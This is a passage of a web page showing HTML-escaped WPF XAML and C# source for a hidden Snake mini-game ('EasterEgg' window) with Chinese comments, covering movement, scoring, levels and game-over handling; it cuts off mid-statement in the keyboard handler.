BorderBrush="Red" Name="border"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Canvas Name="cavas" Background="#CBE9CE"&gt;&lt;/Canvas&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/Border&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/Grid&gt;<br>&lt;/Window&gt;<br><br><br>EasterEgg.xaml.cs<br>using System;<br>using System.Collections.Generic;<br>using System.Linq;<br>using System.Text;<br>using System.Windows;<br>using System.Windows.Controls;<br>using System.Windows.Data;<br>using System.Windows.Documents;<br>using System.Windows.Input;<br>using System.Windows.Media;<br>using System.Windows.Media.Imaging;<br>using System.Windows.Shapes;<br>using System.Timers;<br>using System.Windows.Threading;<br><br>namespace Inspect.UI<br>{<br>&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp; /// Interaction logic for EasterEgg.xaml<br>&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp; public partial class EasterEgg : Window<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; enum Direction { UP, DOWN, LEFT, RIGHT };<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Brush oldBrush = new SolidColorBrush(Color.FromArgb(100, 0, 255, 0));//brush for snake<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Brush newBrush = new SolidColorBrush(Color.FromArgb(100, 255, 0, 0));//brush for destination<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Direction direct;//current direction<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private DispatcherTimer timer = new DispatcherTimer();<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private List&lt;Rectangle&gt; snake = new List&lt;Rectangle&gt;();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private int snakeTail;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Rectangle dest;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private double destTop, destLeft;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private double W, H;<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private int speed;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static readonly DependencyProperty GradeProperty = DependencyProperty.Register("Grade", typeof(int), typeof(EasterEgg));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static readonly DependencyProperty ScoreProperty = DependencyProperty.Register("Score", typeof(int), typeof(EasterEgg));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public int Grade<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get { return Convert.ToInt32(GetValue(GradeProperty)); }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set { SetValue(GradeProperty, value); }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public int Score<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get { return Convert.ToInt32(GetValue(ScoreProperty)); }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set { SetValue(ScoreProperty, value); }&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public EasterEgg()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeComponent();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.DataContext = this;//数据绑定<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void Window_Loaded(object sender, RoutedEventArgs e)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.InitSnake();<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //start timer<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; timer.Tick += new EventHandler(timer_Elapsed);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; timer.Start();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 时钟相应<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="sender"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="e"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void timer_Elapsed(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Walk();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void Walk()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //尾变头<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rectangle tail = snake[snakeTail];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rectangle head = snake[(snakeTail + snake.Count - 1) % snake.Count];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double top = Convert.ToDouble(head.GetValue(Canvas.TopProperty));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double left = Convert.ToDouble(head.GetValue(Canvas.LeftProperty));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (direct)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case Direction.LEFT:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; left -= 10;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case Direction.RIGHT:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; left += 10;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case Direction.UP:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; top -= 10;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case Direction.DOWN:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; top += 10;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //判断是否吃到目标<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (top != destTop || left != destLeft)//如果没有吃到目标<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tail.SetValue(Canvas.TopProperty, top);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tail.SetValue(Canvas.LeftProperty, left);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //snake变长<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dest.Fill = oldBrush;//目标变色，成为snake的一部分<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.snake.Insert(snakeTail,dest);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //分数增加<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.Score = this.Score + 100;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (this.Score % 2000 == 0)//过关<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.Grade = this.Grade + 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.timer.Interval = new TimeSpan(0, 0, 0, 0, speed - 20 * Grade);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //产生新目标<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rand();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //判断是否失败<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (top &lt; 0 || left &lt; 0 || top &gt; this.H - 10.0 || left &gt; this.W - 10.0)//如果跑出边界<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GameOver();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else//判断是否咬到自己<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; snake.Count; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (i == snakeTail)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ((double)snake[i].GetValue(Canvas.TopProperty) == top &amp;&amp; (double)snake[i].GetValue(Canvas.LeftProperty) == left)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GameOver(); <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; snakeTail = (snakeTail + 1) % snake.Count;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 违反规则，GameOver<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void GameOver()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.timer.Stop();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (MessageBox.Show("再来一盘?", "游戏结束", MessageBoxButton.YesNo) == MessageBoxResult.Yes)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.InitSnake();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.timer.Start();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.Close();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 产生一个随机的目标<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void Rand()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dest = Rect(newBrush);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.cavas.Children.Add(dest);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Random rand = new Random(System.DateTime.Now.Millisecond);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; destTop = rand.Next(Convert.ToInt32(this.H)/10) * 10.0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; destLeft = rand.Next(Convert.ToInt32(this.W)/10) * 10.0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dest.SetValue(Canvas.TopProperty, destTop);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dest.SetValue(Canvas.LeftProperty, destLeft);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rectangle Rect(Brush brush)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rectangle rect = new Rectangle();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rect.Height = 10;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rect.Width = 10;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rect.Fill = brush;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return rect;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 初始化Snake<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void InitSnake()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.snake.Clear();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.cavas.Children.Clear();<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //init destination<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rand();<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //init snake<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rectangle beginer = Rect(oldBrush);//the first part of snake<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.cavas.Children.Add(beginer);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.snake.Add(beginer);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; beginer.SetValue(Canvas.TopProperty, 0.0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; beginer.SetValue(Canvas.LeftProperty, 0.0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.direct = Direction.RIGHT;//initial direction<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.snakeTail = 0;<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.Score = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.Grade = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.speed = 200;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.timer.Interval = new TimeSpan(0, 0, 0, 0, speed);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 相应上下左右控制键, 空格暂停<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="sender"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="e"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void Window_KeyDown(object sender, KeyEventArgs e)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (e.Key == Key.Right)//→<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; direct = (direct != Direction.LEFT ? Direction.RIGHT : direct);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (e.Key == Key.Left)//←<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; direct = (direct != Direction.RIGHT ? Direction.LEFT : direct);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (e.Key == Key.Up)//↑<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; direct = (direct != Direction.DOWN ? Direction.UP : direct);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (e.Key == 